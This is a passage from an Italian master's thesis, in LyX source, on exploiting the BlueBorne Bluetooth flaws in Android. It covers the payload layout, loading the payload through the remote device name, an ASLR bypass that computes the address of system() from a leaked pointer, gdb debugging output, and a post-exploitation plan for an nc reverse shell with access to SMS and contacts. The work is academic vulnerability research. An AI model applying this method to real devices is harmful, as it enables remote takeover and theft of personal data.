\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "tab:cve-2017-0781-payload-sample"

\end_inset

Esempio di payload da usare per sfruttare la vulnerabilità CVE-2017-0781
 che rispetta tutti i vincoli
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Dove la prima parte (
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

#
\backslash
x17AAAAAA....
\backslash
n
\end_layout

\end_inset

) è un commento che verrà ignorato per poi eseguire la seconda parte (
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

comandi bash
\backslash
n#
\end_layout

\end_inset

) che lancia comandi bash arbitrari scelti dall'attaccante durante la costruzion
e del 
\emph on
payload
\emph default
.
 Importante notare il carattere 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

#
\end_layout

\end_inset

 finale che serve a commentare tutto ciò che segue i nostri comandi, così
 da non considerare dati spuri che possono derivare da aree di memoria contigue
 al 
\emph on
payload
\emph default
.
\end_layout

\begin_layout Section
Caricare il payload in memoria
\begin_inset CommandInset label
LatexCommand label
name "sec:load-payload-in-memory"

\end_inset


\end_layout

\begin_layout Standard
È necessario inserire il 
\emph on
payload
\emph default
 in Figura 
\begin_inset CommandInset ref
LatexCommand ref
reference "tab:cve-2017-0781-payload-sample"

\end_inset

 in un'area di memoria deterministica per poter essere utilizzato.
\end_layout

\begin_layout Standard
Esaminando il codice sorgente dello stack Bluetooth di Android si può notare
 come molte delle strutture dati correlate alle connesioni Bluetooth attualmente
 attive vengano memorizzate in strutture globali non esplicitamente inizializzat
e, quindi residenti nel segmento 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

BSS
\end_layout

\end_inset

.
\end_layout

\begin_layout Standard
Gli offset delle variabili globali nel segmento BSS sono costanti per 
\emph on
build
\emph default
.
 L'unico elemento non deterministico è l'indirizzo di base, randomizzato
 tramite ASLR.
\end_layout

\begin_layout Standard
All'interno di queste strutture dati che descrivono le connessioni attive
 è presente, tra le altre informazioni, il nome del dispositivo Bluetooth
 remoto.
 Questa informazione è chiaramente sotto il controllo dell'attaccante.
 Per verificare di poter utilizzare il nome del controller con cui ci connettiam
o per trasmettere il 
\emph on
payload
\emph default
 dell'attacco dobbiamo sapere:
\end_layout

\begin_layout Enumerate
qual'è la dimensione massima utilizzabile
\end_layout

\begin_layout Enumerate
se ci sono vincoli sul contenuto del campo
\end_layout

\begin_layout Enumerate
in che momento della comunicazione viene inviato il dato
\end_layout

\begin_layout Standard
Per rispondere a queste domande torniamo sulla documentazione ufficiale
 delle specifiche Bluetooth in cui è riportato che il nome del dispositivo
 viene scambiato quando viene stabilita la connessione 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

ACL
\end_layout

\end_inset

 (il livello su cui poggia L2CAP).
\end_layout

\begin_layout Standard
È inoltre specificato che il nome del dispositivo remoto è una descrizione
 
\emph on
user-friendly
\emph default
 codificata in UTF-8 di massimo 
\begin_inset Formula $248$
\end_inset

 ottetti.
 Se il nome è di lunghezza inferiore, la fine della stringa è indicata con
 un ottetto nullo (
\begin_inset Formula $0\text{x}00$
\end_inset

) e gli ottetti successivi a questo non vanno considerati.
\end_layout

\begin_layout Standard
Quello che ne ricaviamo è che possiamo disporre di un 
\emph on
payload
\emph default
 fino a 
\begin_inset Formula $248$
\end_inset

 byte a condizione che non ci siano byte nulli.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
Per completezza di trattazione si riportano a seguire le strutture dati
 utilizzate da Android che conterranno il 
\emph on
payload
\emph default
; queste si possono trovare in 
\begin_inset CommandInset href
LatexCommand href
name "/stack/btm/btm_int.h"
target "https://android.googlesource.com/platform/system/bt/+/android-7.1.1_r44/stack/btm/btm_int.h#783"

\end_inset

 e sono
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

typedef struct {
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	/****************************************************
\end_layout

\begin_layout Plain Layout

	**      ACL Management
\end_layout

\begin_layout Plain Layout

	****************************************************/
\end_layout

\begin_layout Plain Layout

	tACL_CONN   acl_db[MAX_L2CAP_LINKS];
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

} tBTM_CB;
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

/* Define the ACL Management control structure */
\end_layout

\begin_layout Plain Layout

typedef struct {
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	BD_NAME   remote_name;
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

} tACL_CONN;
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Dove 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

BD_NAME
\end_layout

\end_inset

 è definito in 
\begin_inset CommandInset href
LatexCommand href
name "/stack/include/bt_types.h"
target "https://android.googlesource.com/platform/system/bt/+/android-7.1.1_r44/stack/include/bt_types.h#346"

\end_inset

 come
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

#define BD_NAME_LEN     248
\end_layout

\begin_layout Plain Layout

typedef UINT8 BD_NAME[BD_NAME_LEN + 1]; /* Device name */
\end_layout

\end_inset


\end_layout

\begin_layout Section
Bypassare la randomizzazione degli indirizzi
\end_layout

\begin_layout Standard
\begin_inset CommandInset citation
LatexCommand nocite
key "android_hacker_s_handbook"

\end_inset


\end_layout

\begin_layout Standard
Prima che l'
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

ASLR
\end_layout

\end_inset

 fosse introdotto molti 
\emph on
exploit
\emph default
 per funzionare utilizzavano alcuni indirizzi che erano sempre uguali ad
 ogni esecuzione.
\end_layout

\begin_layout Standard
L'ASLR è una tecnica di mitigazione che non permette di utilizzare questa
 facilitazione introducendo entropia nello spazio degli indirizzi di un
 processo di modo che, ad ogni esecuzione del codice vulnerabile, lo spazio
 degli indirizzi del processo corrispondente risulti diverso (seppur all'interno
 di un 
\emph on
range
\emph default
 di valori noto, ma molto grande).
\end_layout

\begin_layout Standard
Per comprendere meglio il funzionamento dell'ASLR vediamo due esecuzioni
 consecutive di un eseguibile sia su una vecchia versione di Android senza
 ASLR (
\begin_inset Formula $1.5$
\end_inset

), sia su una versione più recente (
\begin_inset Formula $7.1.2$
\end_inset

):
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=bash,tabsize=4"
inline false
status open

\begin_layout Plain Layout

# Due esecuzioni consecutive del comando cat su Android 1.5
\end_layout

\begin_layout Plain Layout

shell@android:/ $ cat /proc/self/maps | head -1
\end_layout

\begin_layout Plain Layout

00008000-00018000 r-xp 00000000 1f:03 520 /system/bin/toolbox
\end_layout

\begin_layout Plain Layout

shell@android:/ $ cat /proc/self/maps | head -1
\end_layout

\begin_layout Plain Layout

00008000-00018000 r-xp 00000000 1f:03 520 /system/bin/toolbox
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

# Due esecuzioni consecutive del comando cat su Android 7.1.2
\end_layout

\begin_layout Plain Layout

shell@android:/ $ cat /proc/self/maps | head -1
\end_layout

\begin_layout Plain Layout

4000e000-4002b000 r-xp 00000000 103:02 267 /system/bin/sh
\end_layout

\begin_layout Plain Layout

shell@android:/ $ cat /proc/self/maps | head -1
\end_layout

\begin_layout Plain Layout

40078000-40095000 r-xp 00000000 103:02 267 /system/bin/sh
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Questo estratto mostra chiaramente che la randomizzazione degli indirizzi
 è presente in Android 
\begin_inset Formula $7.1.2$
\end_inset

, ma non in Android 
\begin_inset Formula $1.5$
\end_inset

.
 Si può infatti osservare che in Android 
\begin_inset Formula $7.1.2$
\end_inset

 l'indirizzo di base (il primo numero mostrato) cambia tra due esecuzioni
 differenti assumendo nel primo caso il valore 
\begin_inset Formula $0\text{x}4000\text{e}000$
\end_inset

 e nel secondo 
\begin_inset Formula $0\text{x}40078000$
\end_inset

, mentre rimane uguale a 
\begin_inset Formula $0\text{x}00008000$
\end_inset

 in Android 
\begin_inset Formula $1.5$
\end_inset

.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/payload-and-system-addresses.png
	display false
	width 100col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:payload-and-system-addresses"

\end_inset

Indirizzi del 
\emph on
payload
\emph default
 e della funzione system nello schema di attacco con BlueBorne
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
In Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:payload-and-system-addresses"

\end_inset

 è mostrato lo schema di attacco che viene utilizzato con BlueBorne, evidenziand
o come vengono utilizzati gli indirizzi del 
\emph on
payload
\emph default
 e della funzione 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

.
 Quanto detto riguardo la randomizzazione degli indirizzi, però, implica
 che non possiamo inserire in maniera statica né l'indirizzo della chiamata
 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

 né quello del 
\emph on
payload
\emph default
 perché questi cambiano ad ogni esecuzione.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
Bypassare questo meccanismo di mitigazione per calcolare l'indirizzo corretto
 implica quindi avere accesso a:
\end_layout

\begin_layout Itemize
un indirizzo qualunque nello spazio degli indirizzi del processo
\end_layout

\begin_layout Itemize
l'
\emph on
offset
\emph default
 di questo indirizzo rispetto a un indirizzo di base che conosciamo che
 utilizzeremo come riferimento
\end_layout

\begin_layout Itemize
l'indirizzo relativo della funzione che ci interessa invocare, o dei dati
 che ci interessa puntare, rispetto allo stesso indirizzo di base precedente
\end_layout

\begin_layout Standard
Per poter fare questo sfruttiamo la vulnerabilità 
\begin_inset CommandInset ref
LatexCommand nameref
reference "sec:android-information-leak-(CVE-2017-0785)"

\end_inset

 spiegata 
\begin_inset CommandInset ref
LatexCommand vpageref
reference "sec:android-information-leak-(CVE-2017-0785)"

\end_inset

 con un dispositivo 
\emph on
target
\emph default
 fisicamente in nostro possesso e su cui possiamo operare con privilegi
 di 
\emph on
root
\emph default
 tramite 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

ADB
\end_layout

\end_inset


\begin_inset Foot
status collapsed

\begin_layout Plain Layout

\size normal
\emph on
tool
\emph default
 a riga di comando che permette di comunicare con un dispositivo Android
\end_layout

\end_inset

.
\end_layout

\begin_layout Standard
Graficamente, possiamo rappresentare il meccanismo di randomizzazione degli
 indirizzi e il metodo per bypassarlo nel modo mostrato in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:aslr-bypass"

\end_inset

.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/aslr-bypass-using-info-leak.png
	display false
	width 100col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:aslr-bypass"

\end_inset

Calcolo indirizzi di base delle librerie in memoria bypassando l'ASLR
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
A seguire il metodo sistematico da seguire per il calcolo degli indirizzi
 della funzione 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

 e del 
\emph on
payload
\emph default
.
\end_layout

\begin_layout Subsection
Calcolo dell'indirizzo della funzione system
\end_layout

\begin_layout Standard
Per prima cosa otteniamo il compilato della libreria 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

libc
\end_layout

\end_inset

 in cui è contenuta la funzione 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

 e cerchiamo di determinare il tipo di file e altre informazioni utili:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

shell@linux:/ $ adb pull /system/lib/libc.so libc.so
\end_layout

\begin_layout Plain Layout

/system/lib/libc.so: 1 file pulled.
 5.4 MB/s (775624 bytes in 0.136s)
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

shell@linux:/ $ file libc.so
\end_layout

\begin_layout Plain Layout

/libc.so: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically
 linked, interpreter /system/bin/linker, BuildID[md5/uuid]=1b58b1c03b1223cb6ec27
87173ab8ca0, not stripped
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Possiamo notare che la libreria risulta 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

not stripped
\end_layout

\end_inset

, cioè contiene tutti i simboli di 
\emph on
debug
\emph default
 tra cui, quindi, anche quelli relativi alla funzione 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

.
 Sfruttiamo questa situazione per ottenere facilmente l'indirizzo relativo
 della funzione 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

.
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

shell@linux:/ $ nm /tmp/libc.so | grep "
\backslash
 system"
\end_layout

\begin_layout Plain Layout

00045f81 T system
\end_layout

\end_inset


\end_layout

\begin_layout Standard
A questo punto cerchiamo il 
\emph on
range
\emph default
 di indirizzi utilizzati dalla libreria 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

libc
\end_layout

\end_inset

 all'interno dello spazio di indirizzi del processo Bluetooth di Android:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

shell@android:/ # cat /proc/$(pidof com.android.bluetooth)/maps | grep libc.so
\end_layout

\begin_layout Plain Layout

e669c000-e6720000 r-xp 00000000 103:09 1342 /system/lib/libc.so
\end_layout

\begin_layout Plain Layout

e6720000-e6724000 r--p 00083000 103:09 1342 /system/lib/libc.so
\end_layout

\begin_layout Plain Layout

e6724000-e6726000 rw-p 00087000 103:09 1342 /system/lib/libc.so
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Otteniamo quindi un 
\emph on
range
\emph default
 di indirizzi che va da 
\begin_inset Formula $0\text{xE}669\text{C}000$
\end_inset

 a 
\begin_inset Formula $0\text{xE}6726000$
\end_inset

.
\end_layout

\begin_layout Standard
A questo punto sfruttiamo la vulnerabilità 
\begin_inset CommandInset ref
LatexCommand nameref
reference "sec:android-information-leak-(CVE-2017-0785)"

\end_inset

 per ottenere un indirizzo in memoria valido che sia all'interno di questo
 range.
\end_layout

\begin_layout Standard
Un esempio di output potrebbe essere:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00
\end_layout

\begin_layout Plain Layout

*
\end_layout

\begin_layout Plain Layout

00000050  00 00 00 00  de a7 d8 0c  de a7 d8 0c  de a7 d8 0c
\end_layout

\begin_layout Plain Layout

00000060  de a7 d8 0c  00 00 00 18  00 00 00 44  de 94 05 69
\end_layout

\begin_layout Plain Layout

00000070  de 94 fa d9  de 94 9b 79  de a7 d8 0c  da 8d a5 20
\end_layout

\begin_layout Plain Layout

00000080  de 99 ff 5b  00 00 00 13  de 73 72 40  de 71 d6 20
\end_layout

\begin_layout Plain Layout

00000090  0e 01 7c e6  cb 40 02 c8  de a7 d8 0c  00 02 00 01
\end_layout

\begin_layout Plain Layout

000000a0  de a7 01 00  de 95 0c 8d  cb 53 58 00  00 00 00 00
\end_layout

\begin_layout Plain Layout

000000b0  de 94 a9 23  cb 53 58 00  00 00 00 00  de a7 8b e4
\end_layout

\begin_layout Plain Layout

000000c0  da 8e 4c b0  de a6 e0 58  00 00 00 44  de a6 e0 10
\end_layout

\begin_layout Plain Layout

000000d0  de 94 00 89  da 8e 20 20  e5 c1 18 c0  29 db b4 24
\end_layout

\begin_layout Plain Layout

000000e0  00 00 00 0a  00 0f 42 40  29 db b4 24  00 00 00 00
\end_layout

\begin_layout Plain Layout

000000f0  de 73 d0 18  00 0f 42 40  de 73 72 40  00 00 00 00
\end_layout

\begin_layout Plain Layout

00000100  00 00 00 00  00 00 00 04  de 96 13 4c  0e 01 7c e6
\end_layout

\begin_layout Plain Layout

00000110  00 00 00 08  de 73 d0 68  de 73 72 40  de 9b d2 4c
\end_layout

\begin_layout Plain Layout

00000120  de 73 72 40  00 00 00 00  db d3 ea 40  de 73 d0 68
\end_layout

\begin_layout Plain Layout

00000130  de 73 72 40  cb 50 00 00  e5 c1 18 c0  00 00 00 03
\end_layout

\begin_layout Plain Layout

00000140  da 8e 20 7c  e5 c1 18 c0  00 00 00 01  da 8e 20 7c
\end_layout

\begin_layout Plain Layout

00000150  e5 c1 18 c0  00 00 00 01  ff ff ff fb  da 8e 25 10
\end_layout

\begin_layout Plain Layout

00000160  e6 70 a5 49  e5 c1 1e 70  e5 c1 1e 58  da 8e 20 68
\end_layout

\begin_layout Plain Layout

00000170  e5 b5 54 08  00 00 00 03  e5 c1 18 c0  e5 c1 1e 38
\end_layout

\end_inset


\end_layout

\begin_layout Standard
In cui possiamo riconoscere all'offset 
\begin_inset Formula $0\text{x}00000160$
\end_inset

 un indirizzo valido (
\begin_inset Formula $0\text{xE}670\text{A}549$
\end_inset

).
\end_layout

\begin_layout Standard
Ora, non sappiamo cosa corrisponda a quest'indirizzo, ma sappiamo che in
 quella posizione sarà sempre contenuto un indirizzo nel range di interesse
 e che il suo offset rispetto l'indirizzo di base sarà sempre lo stesso,
 in questo caso
\end_layout

\begin_layout Standard
\begin_inset Formula 
\[
0\text{xE}670\text{A}549-0\text{xE}669\text{C}000=0\text{x}6\text{E}549
\]

\end_inset


\end_layout

\begin_layout Standard
Questo significa che, anche a fronte di riavvii del processo Bluetooth,
 possiamo sfruttare questa informazione per ricavare l'indirizzo di base
 della libreria 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

libc
\end_layout

\end_inset

, quindi l'indirizzo della funzione 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

system
\end_layout

\end_inset

 nel modo seguente:
\end_layout

\begin_layout Standard
\begin_inset Formula 
\[
\begin{array}{ccccc}
\text{addr}\left(\text{system}\right) & = & \text{addr}\left(\text{base libc}\right) & + & \text{offset}\left(\text{system}\right)\\
 & = & \left(0\text{xE}670\text{A}549-0\text{x}6\text{E}549\right) & + & 0\text{x}45\text{F}81\\
 & = & 0\text{xE}669\text{C}000 & + & 0\text{x}45\text{F}81\\
 & = & 0\text{xE}66\text{E}1\text{F}81
\end{array}
\]

\end_inset


\end_layout

\begin_layout Subsection
Calcolo dell'indirizzo del payload
\end_layout

\begin_layout Standard
\begin_inset CommandInset citation
LatexCommand nocite
key "blueborne_rce_on_android_6_0_1"

\end_inset


\end_layout

\begin_layout Standard
Per prima cosa dobbiamo assicurarci di poter fare 
\emph on
debugging
\emph default
 del processo 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

com.android.bluetooth
\end_layout

\end_inset

.
 Questo è possibile utilizzando 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

gdbserver
\end_layout

\end_inset

 che però non è installato nelle versioni di Android commerciali, quindi
 ne scarichiamo una versione precompilata per l'architettura del nostro
 dispositivo dal 
\emph on
package
\emph default
 Android NDK e la installiamo manualmente:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

shell@linux:/ $ adb push gdbserver /sdcard/Download/
\end_layout

\begin_layout Plain Layout

gdbserver: 1 file pushed.
 9.0 MB/s (847048 bytes in 0.090s)
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

shell@android:/ # mount -t ext4 -o rw,remount /system
\end_layout

\begin_layout Plain Layout

shell@android:/ # cp /sdcard/Download/gdbserver /system/bin/
\end_layout

\begin_layout Plain Layout

shell@android:/ # chown root:shell /system/bin/gdbserver
\end_layout

\begin_layout Plain Layout

shell@android:/ # chmod 0755 /system/bin/gdbserver
\end_layout

\begin_layout Plain Layout

shell@android:/ # mount -t ext4 -o ro,remount /system
\end_layout

\end_inset


\end_layout

\begin_layout Standard
A questo punto impostiamo il nome del nostro controller in qualcosa di facilment
e riconoscibile, ad esempio 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

TEST_TEST_TEST_TEST
\end_layout

\end_inset

.
\end_layout

\begin_layout Standard
Ora, il problema che si pone è quello di essere in grado di bloccare l'esecuzion
e del processo bluetooth dopo che il nome del dispositivo (il nostro 
\emph on
payload
\emph default
) è stato caricato in memoria e durante una connessione attiva.
 Non possiamo impostare un 
\emph on
breakpoint
\emph default
 su un indirizzo che sappiamo rispondere ai requisiti sia perché non conosciamo
 tale indirizzo, sia perché questo potrebbe cambiare da dispositivo a dispositiv
o e da versione a versione.
 Sfruttiamo allora il fatto che il 
\emph on
debugger
\emph default
 si blocca per 
\emph on
default
\emph default
 al momento di un 
\emph on
Segmentation Fault
\emph default
, lo stesso evento che generiamo quando sfruttiamo la vulnerabilità 
\begin_inset CommandInset ref
LatexCommand nameref
reference "sec:Andorid-RCE-(CVE-2017-0781)"

\end_inset

 con un indirizzo non valido a cui puntare, ad esempio 
\begin_inset Formula $0\text{x}41414141$
\end_inset

.
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

shell@android:/ # forward tcp:5039 tcp:5039
\end_layout

\begin_layout Plain Layout

shell@android:/ # gdbserver :5039 --attach $(pidof com.android.bluetooth)
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

peda-arm > target remote :5039
\end_layout

\begin_layout Plain Layout

Remote debugging using :5039
\end_layout

\begin_layout Plain Layout

Reading /system/bin/app_process32 from remote target...
\end_layout

\begin_layout Plain Layout

Reading symbols from target:/system/bin/app_process32...(no debugging symbols
 found)...done.
\end_layout

\begin_layout Plain Layout

Reading /system/bin/linker from remote target...
\end_layout

\begin_layout Plain Layout

Reading symbols from target:/system/bin/linker...(no debugging symbols found)...done.
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

peda-arm > continue
\end_layout

\begin_layout Plain Layout

Continuing.
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

Thread 22 "bluetooth wake" received signal SIGSEGV, Segmentation fault.
\end_layout

\begin_layout Plain Layout

[Switching to Thread 25421.25466]
\end_layout

\begin_layout Plain Layout

Stopped reason: SIGSEGV
\end_layout

\begin_layout Plain Layout

0xee61747c in ?? ()
\end_layout

\end_inset


\end_layout

\begin_layout Standard
A questo punto abbiamo il processo bluetooth bloccato sull'evento del 
\emph on
crash
\emph default
 e nel range di indirizzi del segmento 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

BSS
\end_layout

\end_inset

 sappiamo risiedere il nome del dispositivo remoto contenente il nostro
 
\emph on
payload
\emph default
.
\end_layout

\begin_layout Standard
Eseguiamo quindi:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

shell@android:/ # cat /proc/$(pidof com.android.bluetooth)/maps | grep -A1
 bluetooth.default.so
\end_layout

\begin_layout Plain Layout

...
\end_layout

\begin_layout Plain Layout

ee6a4000-ee780000 rw-p 00000000 00:00 0 [anon:.bss]
\end_layout

\end_inset


\end_layout

\begin_layout Standard
All'interno di questo range cerchiamo la stringa 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

TEST_TEST_TEST_TEST
\end_layout

\end_inset

 impostata come nome del controller Bluetooth ottenendo così l'
\emph on
offset
\emph default
 cercato:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

peda-arm > searchmem "TEST_TEST_TEST_TEST" 0xee6a4000 0xee780000
\end_layout

\begin_layout Plain Layout

[*] Searching for 'TEST_TEST_TEST_TEST' in range: 0xee6a4000 - 0xee780000
\end_layout

\begin_layout Plain Layout

Found 1 results, display max 1 items:
\end_layout

\begin_layout Plain Layout

[anon:.bss] : 0xee731ee1 ("TEST_TEST_TEST_TEST")
\end_layout

\end_inset


\end_layout

\begin_layout Section
Post-exploitation
\end_layout

\begin_layout Standard
\begin_inset CommandInset citation
LatexCommand nocite
key "android_hacker_s_handbook"

\end_inset


\end_layout

\begin_layout Standard
Come mostrato in 
\begin_inset CommandInset ref
LatexCommand nameref
reference "sec:payload-building"

\end_inset

 
\begin_inset CommandInset ref
LatexCommand vpageref
reference "sec:payload-building"

\end_inset

 l'
\emph on
exploit
\emph default
 che possiamo eseguire consta di comandi bash che verranno eseguiti sul
 dispositivo vittima.
 Questo potrebbe essere sufficiente se vogliamo eseguire operazioni per
 cui la sequenza di comandi non superi la dimensione massima consentita
 e per cui non ci interessi avere la risposta indietro.
 Volendo superare questi due limiti possiamo utilizzare 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

nc
\end_layout

\end_inset


\begin_inset Foot
status collapsed

\begin_layout Plain Layout

\emph on
Utility
\emph default
 per leggere e scrivere su una connessione di rete utilizzando TCP o UDP
\end_layout

\end_inset

 (già preinstallato in tutte le versione di Android dalla versione 
\begin_inset Formula $6$
\end_inset

 in poi tramite 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

toybox
\end_layout

\end_inset

) per avviare una 
\emph on
reverse shell
\begin_inset Foot
status collapsed

\begin_layout Plain Layout
È quando una 
\emph on
shell
\emph default
 avviata sul dispositivo vittima si connette all'attaccante per permettergli
 di superare le limitazioni imposte da eventuali firewall di rete
\end_layout

\end_inset


\emph default
 verso un dispositivo sotto il controllo dell'attaccante.
\end_layout

\begin_layout Standard
In questo modo possiamo utilizzare la rete internet per continuare a inviare
 comandi al dispositivo vittima senza più avere bisogno di mantenere la
 prossimità fisica imposta dalla connessione Bluetooth.
\end_layout

\begin_layout Standard
Una volta avviata la 
\emph on
shell
\emph default
 avremo modo di interagire col sistema con i privilegi del servizio 
\begin_inset listings
lstparams "tabsize=4"
inline true
status open

\begin_layout Plain Layout

com.android.bluetooth
\end_layout

\end_inset

 cioè con:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "tabsize=4"
inline false
status open

\begin_layout Plain Layout

uid=1002(bluetooth)
\end_layout

\begin_layout Plain Layout

gid=1002(bluetooth)
\end_layout

\begin_layout Plain Layout

groups=1002(bluetooth), 1016(vpn), 3001(net_bt_admin), 3002(net_bt), 3003(inet),
 3005(net_admin), 3008(net_bt_stack), 3010(wakelock), 9997(everybody), 41002(u0_
a31002)
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Questo si traduce nei seguenti permessi:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language=bash,tabsize=4"
inline false
status open

\begin_layout Plain Layout

# Accesso alla posizione approssimativa
\end_layout

\begin_layout Plain Layout

android.permission.ACCESS_COARSE_LOCATION
\end_layout

\begin_layout Plain Layout

# Accesso alla lista degli utenti
\end_layout

\begin_layout Plain Layout

android.permission.GET_ACCOUNTS
\end_layout

\begin_layout Plain Layout

# Permettono tutti i tipi di interazione con gli altri utenti
\end_layout

\begin_layout Plain Layout

android.permission.INTERACT_ACROSS_USERS
\end_layout

\begin_layout Plain Layout

android.permission.INTERACT_ACROSS_USERS_FULL
\end_layout

\begin_layout Plain Layout

# Permette di gestire gli utenti, compresi interrogazione,
\end_layout

\begin_layout Plain Layout

# creazione e cancellazione
\end_layout

\begin_layout Plain Layout

android.permission.MANAGE_USERS
\end_layout

\begin_layout Plain Layout

# Permettono di leggere e scrivere il registro delle chiamate
\end_layout

\begin_layout Plain Layout

android.permission.READ_CALL_LOG
\end_layout

\begin_layout Plain Layout

android.permission.WRITE_CALL_LOG
\end_layout

\begin_layout Plain Layout

# Permettono di leggere e scrivere la rubrica
\end_layout

\begin_layout Plain Layout

android.permission.READ_CONTACTS
\end_layout

\begin_layout Plain Layout

android.permission.WRITE_CONTACTS
\end_layout

\begin_layout Plain Layout

# Permettono di leggere e scrivere file sulla SD Card
\end_layout

\begin_layout Plain Layout

android.permission.READ_EXTERNAL_STORAGE
\end_layout

\begin_layout Plain Layout

android.permission.WRITE_EXTERNAL_STORAGE
\end_layout

\begin_layout Plain Layout

# Permettono di leggere, scrivere, processare, cancellare
\end_layout

\begin_layout Plain Layout

# e inviare SMS
\end_layout

\begin_layout Plain Layout

android.permission.READ_SMS
\end_layout

\begin_layout Plain Layout

android.permission.WRITE_SMS
\end_layout

\begin_layout Plain Layout

android.permission.RECEIVE_SMS
\end_layout

